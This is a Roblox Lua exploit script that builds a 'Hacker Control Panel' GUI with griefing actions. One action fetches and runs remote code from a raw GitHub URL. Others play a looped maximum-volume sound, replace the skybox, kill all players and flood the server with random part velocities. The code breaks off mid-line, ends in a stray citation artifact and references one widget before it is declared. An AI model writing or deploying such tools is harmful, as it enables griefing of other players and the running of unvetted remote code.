-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

-- Create Frame
local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Active = true
Frame.Draggable = true

-- Create Title Label
local Title = Instance.new("TextLabel")
Title.Parent = Frame
Title.Text = "Hacker Control Panel"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

-- Create Dropdown Menu
local Dropdown = Instance.new("TextButton")
Dropdown.Parent = Frame
Dropdown.Text = "Select Action"
Dropdown.Position = UDim2.new(0, 0, 0, 40)
Dropdown.Size = UDim2.new(1, 0, 0, 30)
Dropdown.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Create Dropdown Options
local Actions = {
    "Execute Backdoor Script",
    "Play Annoying Sound",
    "Change Skybox",
    "Kill All Players",
    "Toggle Server Lag"
}

local DropdownMenu = Instance.new("Frame")
DropdownMenu.Parent = Frame
DropdownMenu.Position = UDim2.new(0, 0, 0, 70)
DropdownMenu.Size = UDim2.new(1, 0, 0, #Actions * 30)
DropdownMenu.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
DropdownMenu.Visible = false

local SelectedAction = nil

for i, action in ipairs(Actions) do
    local Option = Instance.new("TextButton")
    Option.Parent = DropdownMenu
    Option.Text = action
    Option.Size = UDim2.new(1, 0, 0, 30)
    Option.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    Option.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Option.TextColor3 = Color3.fromRGB(255, 255, 255)
    Option.MouseButton1Click:Connect(function()
        SelectedAction = action
        Dropdown.Text = action
        DropdownMenu.Visible = false
        -- Show InputBox if the action requires additional input
        if action == "Play Annoying Sound" then
            InputBox.Visible = true
            InputBox.PlaceholderText = "Enter Sound ID"
        else
            InputBox.Visible = false
        end
    end)
end

Dropdown.MouseButton1Click:Connect(function()
    DropdownMenu.Visible = not DropdownMenu.Visible
end)

-- Create Input Box for additional parameters
local InputBox = Instance.new("TextBox")
InputBox.Parent = Frame
InputBox.Position = UDim2.new(0, 0, 0, 110)
InputBox.Size = UDim2.new(1, 0, 0, 30)
InputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.PlaceholderText = "Enter additional parameter"
InputBox.Visible = false

-- Create Execute Button
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Parent = Frame
ExecuteButton.Text = "Execute"
ExecuteButton.Position = UDim2.new(0, 0, 0, 150)
ExecuteButton.Size = UDim2.new(1, 0, 0, 30)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Define Actions
local function executeBackdoorScript()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/coolrobloxkid23/hahagui/main/script.lua"))()
end

local function playAnnoyingSound(soundId)
    local sound = Instance.new("Sound", game.Workspace)
    sound.SoundId = "rbxassetid://" .. soundId
    sound.Volume = 9999
    sound.Looped = true
    sound:Play()
end

local function changeSkybox()
    local l = game.Lighting
    local ids = "5221523741"
    l.Sky.SkyboxBk = "rbxassetid://" .. ids
    l.Sky.SkyboxDn = "rbxassetid://" .. ids
    l.Sky.SkyboxFt = "rbxassetid://" .. ids
    l.Sky.SkyboxLf = "rbxassetid://" .. ids
    l.Sky.SkyboxRt = "rbxassetid://" .. ids
    l.Sky.SkyboxUp = "rbxassetid://" .. ids
end

local function killAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Health = 0
        end
    end
end

local function toggleServerLag()
    while true do
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Velocity = Vector3.new(math.random(-9999, 9999), math.random(-9999, 9999), math.random(-9999, 9999))
            end
        end
        wait(0.1)
    end
end

-- Execute Selected Action
ExecuteButton.MouseButton1Click:Connect(function()
    if SelectedAction == "Execute Backdoor Script" then
        executeBackdoorScript()
    elseif SelectedAction == "Play Annoying Sound" then
        local soundId = InputBox.Text
        if soundId and soundId ~= "" then
            playAnnoyingSound(soundId)
        else
            warn("Please enter a valid Sound ID.")
        end
    elseif SelectedAction == "Change Skybox" then
        changeSkybox()
    elseif SelectedAction == "
::contentReference[oaicite:6]{index=6}
 
